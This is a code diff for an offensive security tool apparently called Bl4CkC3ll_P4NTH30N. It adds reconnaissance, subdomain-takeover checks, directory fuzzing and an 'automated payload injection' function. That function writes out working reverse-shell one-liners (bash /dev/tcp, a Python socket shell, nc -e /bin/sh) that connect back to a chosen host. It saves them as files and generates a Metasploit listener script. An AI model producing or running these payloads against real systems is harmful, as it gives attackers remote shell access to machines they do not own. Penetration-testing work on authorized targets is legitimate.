@@ -24,6 +24,13 @@ from typing import Dict, List, Any, Optional, Tuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import importlib.util
 
+# BCAR Integration
+try:
+    from bcar import BCARCore, PantheonBCARIntegration
+    BCAR_AVAILABLE = True
+except ImportError:
+    BCAR_AVAILABLE = False
+
 # ---------- App meta ----------
 APP = "Bl4CkC3ll_P4NTH30N"
 AUTHOR = "@cxb3rf1lth"
@@ -4636,7 +4643,11 @@ def display_menu():
     print("\033[92m21. [TUI] Launch Advanced TUI Interface\033[0m")
     print("\033[95m22. [PAYLOADS] Enhanced Payload Management\033[0m")
     print("\033[95m23. [TOOLS] Tool Status & Fallback Management\033[0m")
-    print("\033[91m24. [EXIT] Exit\033[0m")
+    print("\033[94m24. [BCAR] BCAR Enhanced Reconnaissance\033[0m")
+    print("\033[94m25. [TAKEOVER] Advanced Subdomain Takeover\033[0m")
+    print("\033[94m26. [PAYINJECT] Automated Payload Injection\033[0m")
+    print("\033[94m27. [FUZZ] Comprehensive Advanced Fuzzing\033[0m")
+    print("\033[91m28. [EXIT] Exit\033[0m")
     print("\033[31m" + "="*80 + "\033[0m")
 
 def get_choice() -> int:
@@ -6251,6 +6262,30 @@ def main():
         elif c == 23:
             tool_status_management_menu()
         elif c == 24:
+            # BCAR Enhanced Reconnaissance
+            rd, env = start_run("bcar_reconnaissance")
+            cfg = load_cfg()
+            run_bcar_enhanced_reconnaissance(rd, env, cfg)
+            input("Press Enter to continue...")
+        elif c == 25:
+            # Advanced Subdomain Takeover
+            rd, env = start_run("subdomain_takeover")
+            cfg = load_cfg()
+            run_advanced_subdomain_takeover(rd, env, cfg)
+            input("Press Enter to continue...")
+        elif c == 26:
+            # Automated Payload Injection
+            rd, env = start_run("payload_injection")
+            cfg = load_cfg()
+            run_automated_payload_injection(rd, env, cfg)
+            input("Press Enter to continue...")
+        elif c == 27:
+            # Comprehensive Advanced Fuzzing
+            rd, env = start_run("comprehensive_fuzzing")
+            cfg = load_cfg()
+            run_comprehensive_fuzzing(rd, env, cfg)
+            input("Press Enter to continue...")
+        elif c == 28:
             logger.log("Goodbye! Stay secure!", "INFO")
             break
 
@@ -6592,6 +6627,292 @@ def create_tool_status_report():
         
     except Exception as e:
         logger.log(f"Failed to create tool status report: {e}", "ERROR")
+
+# ---------- BCAR Integration Functions ----------
+def run_bcar_enhanced_reconnaissance(rd: RunData, env: Environment, cfg: Dict[str, Any]):
+    """Run BCAR enhanced reconnaissance module"""
+    if not BCAR_AVAILABLE:
+        logger.log("BCAR module not available. Please check bcar.py installation.", "WARNING")
+        return
+    
+    logger.log("🔍 Starting BCAR Enhanced Reconnaissance...", "INFO")
+    
+    try:
+        # Initialize BCAR integration
+        bcar_integration = PantheonBCARIntegration()
+        
+        # Get targets from run data
+        targets = []
+        if hasattr(rd, 'targets_list') and rd.targets_list:
+            targets = rd.targets_list
+        else:
+            # Fallback to reading from targets file
+            if TARGETS.exists():
+                with open(TARGETS, 'r') as f:
+                    targets = [line.strip() for line in f if line.strip()]
+        
+        if not targets:
+            logger.log("No targets found for BCAR scan", "ERROR")
+            return
+        
+        # Configure BCAR scan
+        bcar_config = cfg.get('bcar', {
+            'ct_search': True,
+            'subdomain_enum': True,
+            'takeover_check': True,
+            'port_scan': True,
+            'tech_detection': True,
+            'directory_fuzz': True,
+            'parameter_discovery': True
+        })
+        
+        # Run BCAR scan
+        logger.log(f"Running BCAR scan on {len(targets)} targets...", "INFO")
+        bcar_results = bcar_integration.integrate_with_pantheon_scan(targets, bcar_config)
+        
+        # Save results
+        bcar_output_file = rd.run_dir / "bcar_enhanced_results.json"
+        with open(bcar_output_file, 'w') as f:
+            json.dump(bcar_results, f, indent=2)
+        
+        logger.log(f"✅ BCAR results saved to: {bcar_output_file}", "SUCCESS")
+        
+        # Log summary
+        total_subdomains = 0
+        total_vulnerabilities = 0
+        for domain, results in bcar_results['bcar_results'].items():
+            total_subdomains += len(results.get('subdomains', []))
+            total_vulnerabilities += len(results.get('takeover_vulnerabilities', []))
+        
+        logger.log(f"BCAR Summary: {total_subdomains} subdomains, {total_vulnerabilities} takeover vulnerabilities found", "INFO")
+        
+    except Exception as e:
+        logger.log(f"BCAR reconnaissance failed: {e}", "ERROR")
+
+def run_advanced_subdomain_takeover(rd: RunData, env: Environment, cfg: Dict[str, Any]):
+    """Run advanced subdomain takeover detection and exploitation"""
+    if not BCAR_AVAILABLE:
+        logger.log("BCAR module required for subdomain takeover detection", "WARNING")
+        return
+    
+    logger.log("🎯 Starting Advanced Subdomain Takeover Detection...", "INFO")
+    
+    try:
+        bcar = BCARCore()
+        
+        # Get subdomains from previous reconnaissance
+        subdomains = []
+        
+        # Try to load from BCAR results first
+        bcar_results_file = rd.run_dir / "bcar_enhanced_results.json"
+        if bcar_results_file.exists():
+            with open(bcar_results_file, 'r') as f:
+                bcar_data = json.load(f)
+                for domain_results in bcar_data['bcar_results'].values():
+                    subdomains.extend(domain_results.get('subdomains', []))
+        
+        # Fallback to other subdomain discovery results
+        if not subdomains:
+            subdomain_files = list(rd.run_dir.glob("*subdomain*"))
+            for file in subdomain_files:
+                try:
+                    if file.suffix == '.json':
+                        with open(file, 'r') as f:
+                            data = json.load(f)
+                            if isinstance(data, list):
+                                subdomains.extend(data)
+                    else:
+                        with open(file, 'r') as f:
+                            subdomains.extend([line.strip() for line in f if line.strip()])
+                except Exception:
+                    continue
+        
+        if not subdomains:
+            logger.log("No subdomains found for takeover testing", "ERROR")
+            return
+        
+        subdomains = list(set(subdomains))  # Remove duplicates
+        logger.log(f"Testing {len(subdomains)} subdomains for takeover vulnerabilities...", "INFO")
+        
+        # Run takeover detection
+        vulnerabilities = bcar.subdomain_takeover_check(subdomains)
+        
+        # Save results
+        takeover_file = rd.run_dir / "subdomain_takeover_results.json"
+        with open(takeover_file, 'w') as f:
+            json.dump({
+                'timestamp': datetime.now().isoformat(),
+                'tested_subdomains': len(subdomains),
+                'vulnerabilities': vulnerabilities
+            }, f, indent=2)
+        
+        logger.log(f"✅ Subdomain takeover results saved to: {takeover_file}", "SUCCESS")
+        
+        if vulnerabilities:
+            logger.log(f"🚨 Found {len(vulnerabilities)} potential subdomain takeover vulnerabilities!", "WARNING")
+            for vuln in vulnerabilities:
+                logger.log(f"  - {vuln['subdomain']} ({vuln['service']}) - {vuln['confidence']} confidence", "WARNING")
+        else:
+            logger.log("No subdomain takeover vulnerabilities detected", "INFO")
+        
+    except Exception as e:
+        logger.log(f"Subdomain takeover detection failed: {e}", "ERROR")
+
+def run_automated_payload_injection(rd: RunData, env: Environment, cfg: Dict[str, Any]):
+    """Run automated payload injection with reverse shell capabilities"""
+    logger.log("💉 Starting Automated Payload Injection...", "INFO")
+    
+    try:
+        # Get configuration
+        payload_config = cfg.get('payload_injection', {
+            'lhost': env.get_config_value('payload', 'lhost', '127.0.0.1'),
+            'lport': env.get_config_value('payload', 'lport', 4444),
+            'test_mode': env.get_config_value('payload', 'test_mode', True)
+        })
+        
+        lhost = payload_config['lhost']
+        lport = int(payload_config['lport'])
+        test_mode = payload_config['test_mode']
+        
+        # Initialize payload generation
+        if BCAR_AVAILABLE:
+            bcar_integration = PantheonBCARIntegration()
+            payloads = bcar_integration.generate_meterpreter_payloads(lhost, lport)
+        else:
+            # Fallback payload generation
+            payloads = {
+                'bash_reverse': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+                'python_reverse': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                'nc_reverse': f"nc -e /bin/sh {lhost} {lport}"
+            }
+        
+        # Save payloads to file
+        payloads_file = rd.run_dir / "generated_payloads.json"
+        with open(payloads_file, 'w') as f:
+            json.dump({
+                'timestamp': datetime.now().isoformat(),
+                'configuration': {'lhost': lhost, 'lport': lport, 'test_mode': test_mode},
+                'payloads': payloads
+            }, f, indent=2)
+        
+        logger.log(f"✅ Generated {len(payloads)} payloads saved to: {payloads_file}", "SUCCESS")
+        
+        # Generate payload files in payloads directory
+        payload_scripts_dir = PAYLOADS_DIR / f"run_{rd.run_name}"
+        payload_scripts_dir.mkdir(exist_ok=True)
+        
+        # Create individual payload files
+        for payload_name, payload_content in payloads.items():
+            if payload_name.startswith('msfvenom'):
+                # Save msfvenom commands
+                script_file = payload_scripts_dir / f"{payload_name}.sh"
+                with open(script_file, 'w') as f:
+                    f.write(f"#!/bin/bash\n# {payload_name}\n{payload_content}\n")
+                script_file.chmod(0o755)
+            else:
+                # Save direct payloads
+                payload_file = payload_scripts_dir / f"{payload_name}.txt"
+                with open(payload_file, 'w') as f:
+                    f.write(payload_content)
+        
+        logger.log(f"✅ Payload scripts saved to: {payload_scripts_dir}", "SUCCESS")
+        
+        # In test mode, just log what would be done
+        if test_mode:
+            logger.log("🧪 Test mode enabled - payloads generated but not executed", "INFO")
+            logger.log("To enable payload injection, set test_mode: false in configuration", "INFO")
+        else:
+            logger.log("⚠️  Payload injection is enabled - use responsibly and only on authorized targets", "WARNING")
+        
+        # Create listener setup script
+        listener_script = payload_scripts_dir / "setup_listener.sh"
+        with open(listener_script, 'w') as f:
+            f.write(f"""#!/bin/bash
+# Metasploit listener setup for {lhost}:{lport}
+echo "Setting up Metasploit listener..."
+msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
+""")
+        listener_script.chmod(0o755)
+        
+        logger.log(f"✅ Listener setup script: {listener_script}", "SUCCESS")
+        
+    except Exception as e:
+        logger.log(f"Automated payload injection failed: {e}", "ERROR")
+
+def run_comprehensive_fuzzing(rd: RunData, env: Environment, cfg: Dict[str, Any]):
+    """Run comprehensive fuzzing with BCAR integration"""
+    logger.log("🔀 Starting Comprehensive Fuzzing...", "INFO")
+    
+    try:
+        # Get targets for fuzzing
+        targets = []
+        if hasattr(rd, 'discovered_urls'):
+            targets = rd.discovered_urls
+        else:
+            # Try to get from HTTP probe results
+            http_results_file = rd.run_dir / "http_probe_results.json"
+            if http_results_file.exists():
+                with open(http_results_file, 'r') as f:
+                    http_data = json.load(f)
+                    if isinstance(http_data, list):
+                        targets = [item.get('url', '') for item in http_data if 'url' in item]
+        
+        if not targets:
+            logger.log("No HTTP targets found for fuzzing", "ERROR")
+            return
+        
+        fuzzing_results = []
+        
+        # Use BCAR for advanced fuzzing if available
+        if BCAR_AVAILABLE:
+            bcar = BCARCore()
+            
+            for target in targets[:10]:  # Limit for demo
+                logger.log(f"Fuzzing: {target}", "INFO")
+                try:
+                    findings = bcar.advanced_fuzzing(target)
+                    if findings:
+                        fuzzing_results.extend(findings)
+                        logger.log(f"Found {len(findings)} interesting paths on {target}", "INFO")
+                except Exception as e:
+                    logger.log(f"Fuzzing failed for {target}: {e}", "WARNING")
+        
+        # Fallback to basic directory enumeration
+        else:
+            logger.log("Using basic fuzzing (BCAR not available)", "INFO")
+            common_paths = [
+                'admin', 'login', 'dashboard', 'config', 'backup', 'test', 'dev',
+                'api', 'robots.txt', '.well-known', 'sitemap.xml'
+            ]
+            
+            for target in targets[:5]:  # Limit for demo
+                for path in common_paths:
+                    try:
+                        url = f"{target.rstrip('/')}/{path}"
+                        response = requests.get(url, timeout=5, allow_redirects=False)
+                        if response.status_code in [200, 301, 302, 403]:
+                            fuzzing_results.append({
+                                'url': url,
+                                'status_code': response.status_code,
+                                'content_length': len(response.content)
+                            })
+                    except Exception:
+                        continue
+        
+        # Save fuzzing results
+        fuzzing_file = rd.run_dir / "comprehensive_fuzzing_results.json"
+        with open(fuzzing_file, 'w') as f:
+            json.dump({
+                'timestamp': datetime.now().isoformat(),
+                'targets_fuzzed': len(targets),
+                'findings': fuzzing_results
+            }, f, indent=2)
+        
+        logger.log(f"✅ Fuzzing results saved to: {fuzzing_file}", "SUCCESS")
+        logger.log(f"Fuzzing complete: {len(fuzzing_results)} interesting paths discovered", "INFO")
+        
+    except Exception as e:
+        logger.log(f"Comprehensive fuzzing failed: {e}", "ERROR")
 
 if __name__ == "__main__":
     try:
